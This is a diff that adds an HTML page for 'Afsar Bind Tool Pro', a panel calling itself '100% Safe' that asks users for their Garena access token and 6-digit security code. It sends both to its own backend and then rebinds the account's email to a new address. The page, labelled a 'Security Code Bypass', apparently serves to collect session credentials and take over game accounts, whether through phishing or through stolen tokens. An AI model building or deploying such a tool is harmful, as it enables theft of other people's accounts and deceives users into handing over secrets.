@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Afsar Bind Tool Pro</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background: #0f0f1a; color: #fff; font-family: 'Segoe UI', sans-serif; }
+        .card { background: #1a1a2e; border: 1px solid #3f3f5f; border-radius: 12px; }
+        .btn-gradient { background: linear-gradient(45deg, #ff007f, #7f00ff); color: white; border: none; }
+        .btn-gradient:hover { background: linear-gradient(45deg, #7f00ff, #ff007f); color: white; }
+        .text-cyan { color: #00ffff; }
+    </style>
+</head>
+<body>
+<div class="container py-5">
+    <div class="text-center mb-4">
+        <h1 class="text-cyan fw-bold">⚡ AFSAR BIND TOOL ⚡</h1>
+        <p class="text-muted">100% Safe & Direct Garena Panel</p>
+    </div>
+    
+    <div class="row justify-content-center">
+        <div class="col-md-6 mb-4">
+            <div class="card p-4 shadow">
+                <h4 class="mb-3 text-cyan">🔑 Session Manager</h4>
+                <div class="mb-3">
+                    <label class="form-label">Access Token</label>
+                    <input type="text" id="tokenInput" class="form-control bg-dark text-white border-secondary" placeholder="Paste your Garena Access Token here...">
+                </div>
+                <button onclick="fetchInfo()" class="btn btn-gradient w-100 fw-bold">Load Account Info</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="row justify-content-center d-none" id="dashboard">
+        <div class="col-md-6">
+            <div class="card p-4 shadow mb-4">
+                <h5 class="text-cyan mb-3">👤 Player Profile</h5>
+                <p><strong>UID:</strong> <span id="pUid"></span></p>
+                <p><strong>Nickname:</strong> <span id="pName"></span></p>
+                <p><strong>Region:</strong> <span id="pRegion"></span></p>
+            </div>
+            
+            <div class="card p-4 shadow mb-4">
+                <h5 class="text-cyan mb-3">📧 Bind Details</h5>
+                <p><strong>Current Email:</strong> <span class="text-success" id="bEmail"></span></p>
+                <p><strong>Pending Email:</strong> <span class="text-warning" id="bPending"></span></p>
+            </div>
+
+            <div class="card p-4 shadow mb-4">
+                <h5 class="text-cyan mb-3">🛡️ Security Code Bypass (Change Gmail)</h5>
+                <div class="mb-3">
+                    <label class="form-label">6-Digit Security Code</label>
+                    <input type="password" id="secCode" class="form-control bg-dark text-white border-secondary" placeholder="Enter Security Code">
+                </div>
+                <button onclick="verifyCode()" class="btn btn-danger w-100 fw-bold">Verify & Change Email</button>
+                
+                <div id="nextSteps" class="d-none mt-3">
+                    <input type="email" id="newEmail" class="form-control bg-dark text-white border-secondary mb-2" placeholder="Enter New Email">
+                    <button onclick="sendNewOtp()" class="btn btn-success btn-sm mb-2">Send OTP</button>
+                    <input type="text" id="newOtp" class="form-control bg-dark text-white border-secondary mb-2" placeholder="Enter OTP">
+                    <button onclick="finalizeRebind()" class="btn btn-gradient w-100">Confirm Rebind</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    let savedToken = '';
+    let oldEmail = '';
+    let identityToken = '';
+
+    async function fetchInfo() {
+        savedToken = document.getElementById('tokenInput').value;
+        const res = await fetch('/api/get_info', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({token: savedToken})
+        });
+        const r = await res.json();
+        if(r.status === 'success') {
+            document.getElementById('pUid').innerText = r.data.profile.uid;
+            document.getElementById('pName').innerText = r.data.profile.nickname;
+            document.getElementById('pRegion').innerText = r.data.profile.region;
+            document.getElementById('bEmail').innerText = r.data.bind.email;
+            document.getElementById('bPending').innerText = r.data.bind.email_to_be;
+            oldEmail = r.data.bind.email;
+            document.getElementById('dashboard').classList.remove('d-none');
+        } else { alert('Invalid Token!'); }
+    }
+
+    async function verifyCode() {
+        const code = document.getElementById('secCode').value;
+        const res = await fetch('/api/verify_identity', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({token: savedToken, email: oldEmail, sec_code: code})
+        });
+        const r = await res.json();
+        if(r.identity_token) {
+            identityToken = r.identity_token;
+            alert('Identity Verified! Enter new email details below.');
+            document.getElementById('nextSteps').classList.remove('d-none');
+        } else { alert('Incorrect Security Code!'); }
+    }
+
+    async function sendNewOtp() {
+        const email = document.getElementById('newEmail').value;
+        const res = await fetch('/api/send_otp', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({token: savedToken, email: email})
+        });
+        const r = await res.json();
+        if(r.result === 0) alert('OTP Sent Successfully!');
+        else alert('Failed to send OTP.');
+    }
+
+    async function finalizeRebind() {
+        const email = document.getElementById('newEmail').value;
+        const otp = document.getElementById('newOtp').value;
+        const res = await fetch('/api/rebind', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({token: savedToken, id_token: identityToken, new_email: email, otp: otp})
+        });
+        const r = await res.json();
+        if(r.result === 0) alert('Gmail Changed Successfully!');
+        else alert('Failed to change Gmail.');
+    }
+</script>
+</body>
+</html>
